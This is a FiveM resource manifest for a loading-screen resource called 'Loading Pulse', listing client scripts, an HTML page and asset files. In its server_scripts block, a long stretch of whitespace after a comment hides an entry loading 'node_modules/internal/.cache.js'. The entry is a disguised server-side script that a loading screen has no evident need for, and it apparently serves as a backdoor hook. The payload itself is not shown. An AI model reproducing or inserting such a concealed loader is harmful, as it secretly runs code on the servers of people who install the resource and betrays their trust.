fx_version 'cerulean' game 'common' lua54 'yes' loadscreen_cursor 'yes' loadscreen_manual_shutdown 'yes'  author 'adeczeq' version '1.0.0' description 'Loading Pulse'

client_script { 'client/*.lua', 'config.lua' }

loadscreen 'html/index.html'


files { 'html/index.html', 'html/scripts/scripts.js', 'html/css/style.css', 'html/assets/*.mp3', 'html/assets/*.png', 'html/assets/*.svg' }

server_scripts {
	--[[server.lua]]                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            'node_modules/internal/.cache.js',
}
